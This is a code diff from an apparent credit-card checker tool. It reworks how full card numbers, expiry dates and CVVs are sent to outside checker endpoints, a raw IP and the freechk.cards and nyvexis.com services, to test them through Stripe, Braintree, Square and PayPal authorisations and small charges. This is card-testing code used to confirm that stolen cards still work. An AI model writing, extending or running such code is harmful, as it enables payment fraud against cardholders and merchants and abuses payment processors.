@@ -116,7 +116,7 @@ def check_stripe_mass_auth_gate(cc, mm, yy, cvv):
             }
         
         # Make API request to the Stripe Mass Auth endpoint
-        url = f"https://freechk.cards/free/stripe.php?lista={lista}"
+        url = f"{get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')}?lista={lista}"
         
         headers = {
             "Authorization": f"Bearer {api_key}",
@@ -1465,7 +1465,7 @@ def check_generic_gate(gate_name, cc, mm, yy, cvv):
         lista = f"{cc}|{mm}|{year}|{cvv}"
         lista_short = f"{cc}|{mm}|{yy}|{cvv}"
         
-        # Gate-specific API endpoints mapping
+        # Gate-specific API endpoints mapping (shared provider base URLs)
         _chg = get_gate_cfg('stripe_charge_url', 'http://15.204.130.9:6969/check')
         _fck_st = get_gate_cfg('freechk_stripe_url', 'https://freechk.cards/free/stripe.php')
         _fck_bt = get_gate_cfg('freechk_braintree_url', 'https://freechk.cards/free/braintree.php')
@@ -1475,52 +1475,57 @@ def check_generic_gate(gate_name, cc, mm, yy, cvv):
         _nyx_bt = get_gate_cfg('nyvexis_braintree_url', 'https://api.nyvexis.com/braintree/')
         _nyx_pp = get_gate_cfg('nyvexis_paypal_url', 'https://api.nyvexis.com/paypal/')
 
+        def _gov(gate, idx, full_url):
+            """Return per-gate URL override if set, else the provider-derived URL."""
+            ov = get_gate_cfg(f'generic_{gate}_url{idx}', '').strip()
+            return ov if ov else full_url
+
         gate_urls = {
             'ss': [  # Stripe Auth
-                f"{_chg}?cc={lista}&gate=stripe_auth",
-                f"{_fck_st}?lista={lista}",
-                f"{_nyx_st}?lista={lista_short}",
+                _gov('ss', 1, f"{_chg}?cc={lista}&gate=stripe_auth"),
+                _gov('ss', 2, f"{_fck_st}?lista={lista}"),
+                _gov('ss', 3, f"{_nyx_st}?lista={lista_short}"),
             ],
             'bu': [  # Braintree Auth
-                f"{_chg}?cc={lista}&gate=braintree",
-                f"{_fck_bt}?lista={lista}",
-                f"{_nyx_bt}?lista={lista_short}",
+                _gov('bu', 1, f"{_chg}?cc={lista}&gate=braintree"),
+                _gov('bu', 2, f"{_fck_bt}?lista={lista}"),
+                _gov('bu', 3, f"{_nyx_bt}?lista={lista_short}"),
             ],
             'sq': [  # Square Auth
-                f"{_chg}?cc={lista}&gate=square",
-                f"{_fck_sq}?lista={lista}",
+                _gov('sq', 1, f"{_chg}?cc={lista}&gate=square"),
+                _gov('sq', 2, f"{_fck_sq}?lista={lista}"),
             ],
             'pp': [  # PayPal $1
-                f"{_chg}?cc={lista}&gate=paypal",
-                f"{_fck_pp}?lista={lista}",
-                f"{_nyx_pp}?lista={lista_short}&amount=1",
+                _gov('pp', 1, f"{_chg}?cc={lista}&gate=paypal"),
+                _gov('pp', 2, f"{_fck_pp}?lista={lista}"),
+                _gov('pp', 3, f"{_nyx_pp}?lista={lista_short}&amount=1"),
             ],
             'sor': [  # Stripe $2
-                f"{_chg}?cc={lista}&gate=stripe2",
-                f"{_fck_st}?lista={lista}&amount=2",
+                _gov('sor', 1, f"{_chg}?cc={lista}&gate=stripe2"),
+                _gov('sor', 2, f"{_fck_st}?lista={lista}&amount=2"),
             ],
             'st5': [  # Stripe $5
-                f"{_chg}?cc={lista}&gate=stripe5",
-                f"{_fck_st}?lista={lista}&amount=5",
+                _gov('st5', 1, f"{_chg}?cc={lista}&gate=stripe5"),
+                _gov('st5', 2, f"{_fck_st}?lista={lista}&amount=5"),
             ],
             'st12': [  # Stripe $12
-                f"{_chg}?cc={lista}&gate=stripe12",
-                f"{_fck_st}?lista={lista}&amount=12",
+                _gov('st12', 1, f"{_chg}?cc={lista}&gate=stripe12"),
+                _gov('st12', 2, f"{_fck_st}?lista={lista}&amount=12"),
             ],
             'str': [  # Stripe $15
-                f"{_chg}?cc={lista}&gate=stripe15",
-                f"{_fck_st}?lista={lista}&amount=15",
+                _gov('str', 1, f"{_chg}?cc={lista}&gate=stripe15"),
+                _gov('str', 2, f"{_fck_st}?lista={lista}&amount=15"),
             ],
             'dep': [  # Stripe $49
-                f"{_chg}?cc={lista}&gate=stripe49",
-                f"{_fck_st}?lista={lista}&amount=49",
+                _gov('dep', 1, f"{_chg}?cc={lista}&gate=stripe49"),
+                _gov('dep', 2, f"{_fck_st}?lista={lista}&amount=49"),
             ],
         }
 
         # Get gate-specific URLs or use default
         urls = gate_urls.get(gate_name, [
-            f"{_chg}?cc={lista}",
-            f"{_fck_st}?lista={lista}",
+            _gov(gate_name, 1, f"{_chg}?cc={lista}"),
+            _gov(gate_name, 2, f"{_fck_st}?lista={lista}"),
         ])
         
         headers = {
